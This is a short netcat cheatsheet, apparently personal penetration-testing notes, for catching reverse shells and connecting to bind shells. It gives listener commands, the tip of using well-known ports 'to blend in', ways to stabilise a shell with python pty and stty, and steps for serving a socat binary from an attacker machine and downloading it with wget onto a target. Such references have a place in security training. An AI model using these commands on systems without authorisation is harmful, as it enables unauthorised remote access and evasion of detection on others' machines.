# Netcat Cheatsheet

## Basics

* Can be used to listen for incomming connections to establish a reverse shell or connect to a bind shell.

### Help

```bash
nc -h
```

---

## Usage

### Flags

* `-l` : listen mode.
* `-n` : Don't resolve with DNS. Just use IP addresses.
* `-v` : Verbose output.
* `-p` : Specify the port to use. Ports below 1024 require `sudo` priviliges.

In order to blend in, use well known ports to listen on.

### Stabilisation

#### Python

```bash
python -c 'import pty;pty.spawn("/bin/bash")'   # May need to speicfy python version (e.g. python3)
export TERM=xterm                               # access to commands suchas `clear`
# Background the shell with CTRL + Z
stty raw -echo; fg                              # Turn off local `echo` and foregrounds the shell

# Note: `echo` is turned of. If the shell dies, use `reset` to turn it back on.
```

#### rlwrap

* Install with `sudo apt install rlwrap`

```bash
rlwrap nc -lnvp <port>                          # Starts a listener
# Background the shell with CTRL + Z
stty raw -echo; fg                              # Turn off local `echo` and foregrounds the shell
```

#### Socat

```bash
sudo python3 -m http.server 80                  # Start a http server on the attacker machine
wget <LOCAL-IP>/socat -O /tmp/socat             # Download the socat static compiled binary to the target machine
```

## Examples

```bash
# Basic most common use case to listen for an incomming shell
nc -lnvp 443

# Connect to a listener
nc 10.10.1.101 4444

```
